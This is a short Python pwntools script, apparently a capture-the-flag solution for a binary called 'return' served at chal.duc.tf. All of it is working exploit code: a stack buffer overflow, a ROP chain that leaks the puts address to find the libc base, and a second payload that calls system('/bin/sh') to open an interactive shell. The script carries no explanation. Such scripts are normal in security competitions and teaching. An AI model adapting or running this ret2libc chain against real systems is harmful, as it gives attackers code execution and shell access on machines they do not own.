#!/usr/bin/python

from pwn import *

#io = process("./return")
io = remote("chal.duc.tf", "30003")
elf = ELF("./return")

offset = 56
pr = 0x40122b #pop_rdi
ret = 0x401016

#offset from libc
puts_offset = 0x809c0
system_offset = 0x04f440
bin_sh_offset =  0x1b3e9a

log.info(io.recvline())
log.info(io.recvline())

payload = "A"*offset
payload += p64(pr)
payload += p64(elf.got["puts"])
payload += p64(elf.sym["puts"])
payload += p64(elf.sym["vuln"])

io.sendline(payload)

leaked_address = u64(io.recvline().strip().ljust(8, "\x00"))
base_address = leaked_address - puts_offset

log.info("Base Address: " + hex(base_address))

system = base_address + system_offset
bin_sh = bin_sh_offset + base_address

io.recvline()

payload = "A"*offset
payload += p64(ret)
payload += p64(pr)
payload += p64(bin_sh)
payload += p64(system)

io.sendline(payload)
io.interactive()
